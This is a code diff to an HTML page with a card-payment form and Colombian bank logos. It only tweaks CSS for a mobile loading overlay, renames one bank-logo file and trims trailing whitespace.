@@ -488,6 +488,7 @@
             height: 100%;
             background: rgba(255, 255, 255, 0.92);
             backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
             z-index: 1000;
             justify-content: center;
             align-items: center;
@@ -507,6 +508,8 @@
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.12);
             text-align: center;
             animation: slideUp 0.4s ease-out;
+            margin: 0 auto;
+            position: relative;
         }
 
         @keyframes slideUp {
@@ -774,6 +777,9 @@
             display: block;
         }
 
+        /* ============================================ */
+        /* RESPONSIVE PARA PANTALLA DE CARGA EN MÓVIL   */
+        /* ============================================ */
         @media (max-width: 768px) {
             .content-wrapper {
                 flex-direction: column;
@@ -785,7 +791,13 @@
             .form-header h1 { font-size: 1.25rem; }
             .btn { width: 100%; }
             .expiry-cvc-grid { grid-template-columns: 1fr 1fr; }
-            .loading-card { padding: 28px 20px; }
+            
+            .loading-card {
+                padding: 28px 20px;
+                width: 92%;
+                max-width: 380px;
+                margin: 0 auto;
+            }
             .logos-header { gap: 12px; }
             .logo-item .logo-img { height: 36px; max-width: 70px; }
             .logo-divider { font-size: 1rem; }
@@ -795,9 +807,27 @@
             .form-header h1 { font-size: 1.125rem; }
             .form-header p { font-size: 0.875rem; }
             .expiry-cvc-grid { grid-template-columns: 1fr; gap: 16px; }
-            .loading-card { padding: 24px 16px; }
+            
+            .loading-card {
+                padding: 24px 16px;
+                width: 94%;
+                max-width: 340px;
+                margin: 0 auto;
+            }
             .logo-item .logo-img { height: 30px; max-width: 60px; }
             .logos-header { gap: 8px; }
+            .logo-item .logo-label { font-size: 0.5rem; }
+        }
+
+        /* Para pantallas muy pequeñas */
+        @media (max-width: 360px) {
+            .loading-card {
+                padding: 20px 12px;
+                width: 96%;
+            }
+            .logo-item .logo-img { height: 26px; max-width: 50px; }
+            .loading-card .loading-text { font-size: 0.95rem; }
+            .loading-card .loading-subtext { font-size: 0.75rem; }
         }
     </style>
 </head>
@@ -1064,7 +1094,7 @@
         // ============================================
         const bankLogos = {
             'Bancolombia': 'bancol.png',
-            'Caja Social': 'caja.png',
+            'Caja Social': 'Caja.jpg',
             'Itaú': 'itau.png',
             'Banco Occidente': 'occi.png',
             'Banco Popular': 'popu.png',
@@ -1636,4 +1666,4 @@
         });
     </script>
 </body>
-                                                                              </html>
+</html>
